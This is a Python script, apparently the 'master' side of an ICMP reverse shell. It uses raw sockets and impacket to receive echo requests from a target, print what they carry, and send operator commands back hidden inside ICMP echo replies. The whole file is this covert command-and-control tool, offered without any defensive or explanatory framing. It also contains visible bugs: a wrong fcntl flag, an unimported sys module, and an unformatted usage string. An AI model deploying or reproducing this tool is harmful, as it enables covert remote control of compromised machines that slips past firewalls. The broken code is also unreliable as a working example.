# Master Server

from socket import socket, AF_INET, SOCK_RAW, IPPROTO_ICMP, IPPROTO_IP, IP_HDRINCL, error
from fcntl import fcntl, F_GETFL, F_SETFL
from os import O_NONBLOCK
from sys import argv, stdin, stdout
from impacket import ImpactDecoder, ImpactPacket
from select import select

# Sets a file descriptor non-blocking
def setNonBlocking(fd):
    flags = fcntl(fd, F_GETFL)
    flags = flags | O_NONBLOCK
    fcntl(fd, F_GETFL, flags)

def main(src, dst):
    # Make standard input a non-blocking file
    stdin_fd = stdin.fileno()
    setNonBlocking(stdin_fd)

    # Open one socket for ICMP protocol
    # A special option is set on the socket so that IP headers are included
    # with the returned data
    s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
    s.setblocking(0)
    s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)

    # Create a new IP packet and set its source and destination addresses
    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)

    # Create a new ICMP packet of type ECHO REPLY
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)

    # Instantiate an IP packets decoder
    decoder = ImpactDecoder.IPDecoder()

    print('[+] Listening...')
    while 1:
        cmd = ''

        # Wait for incoming replies
        if s in select([ s ], [], [])[0]:
            buff = s.recv(4096)

            if 0 == len(buff):
                # Socket remotely closed
                s.close()
                exit(0)

            # Packet received; decode and display it
            ippacket = decoder.decode(buff)
            icmppacket = ippacket.child()

            # If the packet matches, report it to the user
            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
                # Get identifier and sequence number
                ident = icmppacket.get_icmp_id()
                seq_id = icmppacket.get_icmp_seq()
                data = icmppacket.get_data_as_string()

                if len(data) > 0:
                    stdout.write(data)

                # Parse command from standard input
                try:
                    cmd = sys.stdin.readline()
                except:
                    pass

                if cmd == 'exit\n':
                    return

                # Set sequence number and identifier
                icmp.set_icmp_id(ident)
                icmp.set_icmp_seq(seq_id)

                # Include the command as data inside the ICMP packet
                icmp.contains(ImpactPacket.Data(cmd))

                # Calculate its checksum
                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1

                # Have the IP packet contain the ICMP packet (along with its payload)
                ip.contains(icmp)

                # Send it to the target host
                s.sendto(ip.get_packet(), (dst, 0))

#test = stdin.fileno()
#print test
#print setNonBlocking(test)
#try:
#    s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
#except error as e:
#    print('[!] Uh-oh: {}'.format(e))
#    print('[+] Must be ran with super cow powers!')
#    exit()

if __name__ == '__main__':
    try:
        target = argv[1]
        host = argv[2]
    except IndexError as e:
        print('[!] Uh-oh: {}'.format(e))
        print('[+] Usage: sudo {} [ target ] [ host ]')
        exit()
    main(argv[1], argv[2])
